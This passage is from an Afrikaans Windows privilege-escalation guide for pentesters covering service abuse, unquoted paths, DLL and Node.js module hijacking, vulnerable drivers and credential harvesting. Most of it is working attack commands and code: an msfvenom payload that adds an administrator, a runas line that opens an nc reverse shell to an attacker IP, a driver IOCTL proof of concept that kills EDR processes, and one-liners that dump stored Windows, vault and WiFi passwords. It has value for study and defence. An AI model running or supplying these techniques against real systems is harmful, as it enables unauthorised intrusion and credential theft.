Kies ’n diens wat ’n normale gebruiker kan begin (byvoorbeeld **`msiserver`**) en aktiveer dit ná die skryfaksie. **Nota:** die publieke exploit-implementering **sluit die werkstasie** as deel van die wedloop.

Voorbeeldnutsmiddels (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### AppendData/AddSubdirectory-permissies vir Services-register

As jy hierdie permission oor ’n registry het, beteken dit **dat jy sub-registries vanaf hierdie een kan skep**. In die geval van Windows services is dit **genoeg om arbitrary code uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die path na ’n executable nie binne aanhalingstekens is nie, sal Windows probeer om elke ending voor ’n spasie uit te voer.

Byvoorbeeld, vir die path _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspaaie sonder aanhalingstekens, met uitsluiting van dié wat aan ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig ’n diens-binêre lêer met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat uitgevoer moet word indien ’n diens faal. Hierdie funksie kan gekonfigureer word om na ’n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede kan in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) gevind word.

## Toepassings

### Geïnstalleerde toepassings

Kontroleer **die toestemmings van die binaries** (miskien kan jy een oorskryf en privilege escalation uitvoer) en van die **vouers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryftoestemmings

Kontroleer of jy een of ander config-lêer kan wysig om ’n spesiale lêer te lees, of of jy een of ander binary kan wysig wat deur ’n Administrator-rekening uitgevoer gaan word (schedtasks).

’n Manier om swak folder-/lêertoestemmings in die stelsel te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ laai enige plugin-DLL onder sy `plugins`-subvouers outomaties. Indien ’n skryfbare portable/copy-installering teenwoordig is, gee die plasing van ’n kwaadwillige plugin outomatiese code execution binne `notepad++.exe` met elke launch (insluitend vanuit `DllMain` en plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Kyk of jy ’n registry of binary kan oorskryf wat deur ’n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns-liggings om privileges te eskaleer**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Soek na moontlike **third party vreemde/kwesbare** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As ’n driver ’n arbitrêre kernel read/write-primitief blootstel (algemeen in swak ontwerpte IOCTL-handlers), kan jy eskaleer deur ’n SYSTEM-token direk uit kernel-geheue te steel. Sien die stap-vir-stap-tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vir race-condition-bugs waar die kwesbare oproep ’n aanvaller-beheerde Object Manager-pad oopmaak, kan die opsetlike vertraging van die lookup (deur komponente met maksimum lengte of diep directory-kettings te gebruik) die venster van mikrosekondes tot tientalle mikrosekondes verleng:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive-kwesbaarhede laat jou toe om deterministiese layouts op te stel, skryfbare HKLM/HKU-afstammelinge te misbruik, en metadata-korrupsie in kernel paged-pool-overflows om te skakel sonder ’n custom driver. Leer die volledige ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Sommige drivers aanvaar ’n registry-pad vanaf userland, valideer slegs dat dit ’n geldige UTF-16-string is, en roep dan `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` met `RTL_QUERY_REGISTRY_DIRECT` na ’n stack-scalar soos `int readValue`. As `RTL_QUERY_REGISTRY_TYPECHECK` ontbreek, word `EntryContext` volgens die **werklike** registry-tipe geïnterpreteer, nie volgens die tipe wat die ontwikkelaar verwag het nie.

Dit skep twee nuttige primitives:

- **Confused deputy / oracle**: ’n gebruiker-beheerde absolute `\Registry\...`-pad laat die driver toe om aanvaller-gekose keys te query, bestaan deur return codes/logs uit te lek, en soms waardes te lees waartoe die caller nie direk toegang kon kry nie.
- **Kernel memory corruption**: ’n scalar-bestemming soos `&readValue` word volgens die registry-valuetipe as ’n `REG_QWORD`, `UNICODE_STRING` of sized binary buffer verkeerd geïnterpreteer.

Praktiese exploitation-notas:

- **Windows 8+ mitigation**: indien die query ’n **untrusted hive** tref met `RTL_QUERY_REGISTRY_DIRECT`, maar sonder `RTL_QUERY_REGISTRY_TYPECHECK`, crash kernel callers met `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Om exploitability te behou, soek eerder **attacker-writable keys binne trusted system hives** as om waardes onder `HKCU` te stage.
- **Trusted-hive staging**: gebruik NtObjectManager om skryfbare afstammelinge van `\Registry\Machine` te enumerate, en voer die scan weer uit met ’n gedupliseerde **low-integrity** token om keys te vind wat vanuit sandboxed contexts bereikbaar is:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: ’n direkte skryf van 8 grepe na ’n 4-grepe `int` korrupteer aangrensende stack-data en kan ’n nabygeleë callback/function pointer gedeeltelik oorskryf.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direkte modus verwag dat `EntryContext` na ’n `UNICODE_STRING` wys. As die kode eers ’n aanvaller-beheerde `REG_DWORD` in ’n stack-scalar laai en dan dieselfde buffer vir ’n string-lees hergebruik, beheer die aanvaller `Length`/`MaximumLength` en beïnvloed hy die `Buffer`-pointer gedeeltelik, wat ’n semi-beheerde kernel-skryf tot gevolg het.
- **`REG_BINARY`**: vir groot binary-data behandel direkte modus die eerste `LONG` by `EntryContext` as ’n signed buffer size. As ’n vorige `REG_DWORD`-lees ’n **negatiewe**, aanvaller-beheerde waarde in die hergebruikte scalar laat, kopieer die volgende `REG_BINARY`-query aanvaller-grepe direk oor aangrensende stack-slots. Dit is dikwels die skoonste pad na ’n volledige callback-pointer-oorskrywing.

Sterk hunting pattern: **heterogene registry reads na dieselfde stack-variable sonder om dit te herinitialiseer**. Grep vir `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, hergebruikte `EntryContext`-pointers, en kodepaaie waar die eerste registry read beheer of ’n tweede read plaasvind.

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op device objects (LPE + EDR kill)

Sommige signed third‑party drivers skep hul device object met ’n sterk SDDL via IoCreateDeviceSecure, maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie flag word die secure DACL nie afgedwing wanneer die device oopgemaak word deur ’n pad wat ’n ekstra komponent bevat nie. Dit laat enige unprivileged user toe om ’n handle te verkry deur ’n namespace path soos die volgende te gebruik:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (uit ’n werklike geval)

Sodra ’n user die device kan oopmaak, kan privileged IOCTLs wat deur die driver blootgestel word vir LPE en tampering misbruik word. Voorbeeldvermoëns wat in die praktyk waargeneem is:
- Gee full-access handles na arbitrary processes terug (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, insluitend Protected Process/Light (PP/PPL), wat AV/EDR kill vanuit user land via die kernel moontlik maak.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigasies vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN wanneer jy device objects skep wat deur ’n DACL beperk moet word.
- Valideer die caller-konteks vir bevoorregte bewerkings. Voeg PP/PPL-kontroles by voordat prosesbeëindiging of handlere teruggestuur word.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Opsporingsidees vir verdedigers
- Monitor user-mode opens van verdagte device name (bv. \\ .\\amsdk*) en spesifieke IOCTL-sekwense wat op misbruik dui.
- Dwing Microsoft se vulnerable driver blocklist af (HVCI/WDAC/Smart App Control) en handhaaf jou eie allow/deny lists.


## PATH DLL Hijacking

As jy **write permissions binne ’n folder teenwoordig op PATH** het, kan jy moontlik ’n DLL wat deur ’n proses gelaai word, hijack en **privileges eskaleer**.

Kontroleer die permissions van alle folders binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dit is ’n **Windows uncontrolled search path**-variant wat **Node.js**- en **Electron**-toepassings raak wanneer hulle ’n bare import soos `require("foo")` uitvoer en die verwagte module **ontbreek**.

Node resolveer packages deur die gidsboom op te loop en `node_modules`-vouers in elke ouergids na te gaan. Op Windows kan daardie soektog die drive root bereik, sodat ’n toepassing wat vanaf `C:\Users\Administrator\project\app.js` geloods word, uiteindelik die volgende kan ondersoek:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As ’n **low-privileged user** `C:\node_modules` kan skep, kan hulle ’n malicious `foo.js` (of package folder) plant en wag dat ’n **higher-privileged Node/Electron process** die ontbrekende dependency resolveer. Die payload voer uit in die security context van die victim process, en dit word dus **LPE** wanneer die target as ’n administrator, vanuit ’n elevated scheduled task/service wrapper, of vanuit ’n auto-started privileged desktop app loop.

Dit kom veral algemeen voor wanneer:

- ’n dependency in `optionalDependencies` verklaar word
- ’n third-party library `require("foo")` in `try/catch` omvou en voortgaan wanneer dit faal
- ’n package uit production builds verwyder is, tydens packaging weggelaat is, of nie kon installeer nie
- die kwesbare `require()` diep binne die dependency tree voorkom in plaas van in die main application code

### Soek na kwesbare teikens

Gebruik **Procmon** om die resolution path te bewys:

- Filter volgens `Process Name` = target executable (`node.exe`, die Electron app EXE, of die wrapper process)
- Filter volgens `Path` `contains` `node_modules`
- Fokus op `NAME NOT FOUND` en die finale suksesvolle open onder `C:\node_modules`

Nuttige code-review-patrone in uitgepakte `.asar`-lêers of application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifiseer die **ontbrekende pakketnaam** vanaf Procmon of bronkodehersiening.
2. Skep die wortel-opsoekgids indien dit nog nie bestaan nie:
```powershell
mkdir C:\node_modules
```
3. Plaas ’n module met presies die verwagte naam:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Aktiveer die slagoffertoepassing. As die toepassing `require("foo")` probeer uitvoer en die wettige module ontbreek, kan Node `C:\node_modules\foo.js` laai.

Werklike voorbeelde van ontbrekende opsionele modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **tegniek** is die herbruikbare deel: vind enige **ontbrekende bare import** wat ’n geprivilegieerde Windows Node/Electron-proses sal resolve.

### Idees vir opsporing en hardening

- Genereer ’n waarskuwing wanneer ’n gebruiker `C:\node_modules` skep of nuwe `.js`-lêers/pakkette daarheen skryf.
- Soek na hoë-integriteit-prosesse wat vanaf `C:\node_modules\*` lees.
- Pakket alle runtime-afhanklikhede in produksie en ouditteer die gebruik van `optionalDependencies`.
- Hersien derdeparty-kode vir stille `try { require("...") } catch {}`-patrone.
- Deaktiveer opsionele probes wanneer die library dit ondersteun (byvoorbeeld, sommige `ws`-deployments kan die legacy `utf-8-validate`-probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Netwerk

### Gedeelde hulpbronne
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kyk vir ander bekende rekenaars wat hardcoded in die hosts file is
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkkoppelvlakke en DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop poorte

Kontroleer vir **beperkte dienste** van buite af
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-reëls

[**Gaan hierdie bladsy na vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

[Meer opdragte vir netwerk-enumerasie hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root-gebruiker kry, kan jy op enige poort luister (die eerste keer wat jy `nc.exe` gebruik om op ’n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL`-lêerstelsel verken in die vouer `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows-geloofsbriewe

### Winlogon-geloofsbriewe
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor gebruikers se aanmeldbesonderhede vir servers, websites en ander programme waarby **Windows** gebruikers **outomaties kan aanmeld**. Met die eerste oogopslag mag dit lyk asof gebruikers nou hul Facebook-aanmeldbesonderhede, Twitter-aanmeldbesonderhede, Gmail-aanmeldbesonderhede, ensovoorts kan stoor, sodat hulle outomaties via browsers kan aanmeld. Maar dit is nie die geval nie.

Windows Vault stoor aanmeldbesonderhede waarmee Windows gebruikers outomaties kan aanmeld, wat beteken dat enige **Windows application that needs credentials to access a resource** (server of website) **can make use of this Credential Manager** & Windows Vault en die verskafde aanmeldbesonderhede kan gebruik, in plaas daarvan dat gebruikers elke keer die username en password invoer.

Tensy die programme met Credential Manager interaksie het, dink ek nie dit is moontlik vir hulle om die aanmeldbesonderhede vir ’n gegewe hulpbron te gebruik nie. Dus, as jou toepassing van die vault gebruik wil maak, moet dit op een of ander manier **met die credential manager kommunikeer en die aanmeldbesonderhede vir daardie hulpbron aanvra** vanaf die verstekbergingsvault.

Gebruik `cmdkey` om die gestoorde aanmeldbesonderhede op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde credentials te gebruik. Die volgende voorbeeld roep ’n remote binary via ’n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met ’n verskafde stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let daarop dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of vanaf [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP-toepassings, Microsoft Edge en moderne stelseldienste stoor authentication tokens en plaintext-wagwoorde binne die Universal Windows Platform (UWP) `PasswordVault` (ook as `Web Credentials` in `vaultcmd` blootgestel). Hierdie stoorspasie is sessie-geïsoleerd en kan native gedekripteer word sonder administratiewe of `SeDebugPrivilege`-regte.

Voer hierdie PowerShell-opdrag binne die gebruiker se aktiewe sessie uit om alle gestoorde gebruikersname en plaintext-wagwoorde onmiddellik te dump en te dekripteer:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; v = New-Object Windows.Security.Credentials.PasswordVault; v.RetrieveAll() | ForEach-Object { try { \(_.RetrievePassword();\)_ } catch{} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

Die **Data Protection API (DPAPI)** bied ’n metode vir simmetriese enkripsie van data, wat hoofsaaklik binne die Windows-bedryfstelsel gebruik word vir die simmetriese enkripsie van asimmetriese private sleutels. Hierdie enkripsie gebruik ’n gebruiker- of stelselgeheim om aansienlik tot die entropie by te dra.

**DPAPI maak die enkripsie van sleutels moontlik deur middel van ’n simmetriese sleutel wat van die gebruiker se aanmeldgeheime afgelei word**. In scenario’s wat stelselenkripsie behels, gebruik dit die stelsel se domeinverifikasiegeheime.

Geënkripteerde gebruiker-RSA-sleutels wat DPAPI gebruik, word in die `%APPDATA%\Microsoft\Protect\{SID}`-gids gestoor, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, wat saam met die hoofsleutel geleë is wat die gebruiker se private sleutels in dieselfde lêer beskerm**, bestaan tipies uit 64 grepe ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is, wat voorkom dat die inhoud daarvan deur middel van die `dir`-opdrag in CMD gelys word, hoewel dit deur PowerShell gelys kan word.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike arguments (`/pvk` of `/rpc`) gebruik om dit te dekripteer.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om dit te dekripteer.\
Jy kan baie DPAPI-**masterkeys** uit **memory** onttrek met die `sekurlsa::dpapi`-module (indien jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels vir **scripting** en outomatiseringstake gebruik as ’n manier om geënkripteerde credentials gerieflik te stoor. Die credentials word met **DPAPI** beskerm, wat gewoonlik beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, gedekripteer kan word.

Om PS credentials uit die lêer wat dit bevat te **dekripteer**, kan jy die volgende doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan dit vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Afgeleë werkskerm Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg`-module met die toepaslike `/masterkey` om **enige .rdg-lêers te dekripteer**\
Jy kan **baie DPAPI-masterkeys** uit geheue onttrek met die Mimikatz `sekurlsa::dpapi`-module

### Sticky Notes

Mense gebruik dikwels die StickyNotes-toepassing op Windows-werkstasies om **wagwoorde** en ander inligting te **stoor**, sonder om te besef dat dit ’n databasislêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om voor te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat jy ’n Administrateur moet wees en onder ’n Hoë Integriteitsvlak moet loop om wagwoorde uit AppCmd.exe te herwin.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\`-gids.\
As hierdie lêer bestaan, is dit moontlik dat sommige **geloofsbriewe** gekonfigureer is en **herwin** kan word.

Hierdie kode is uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) onttrek:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installeerders word met **SYSTEM-voorregte uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Geloofsbriewe)

### Putty-geloofsbriewe
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in register

SSH-private sleutels kan binne die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy nagaan of daar enigiets interessants daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
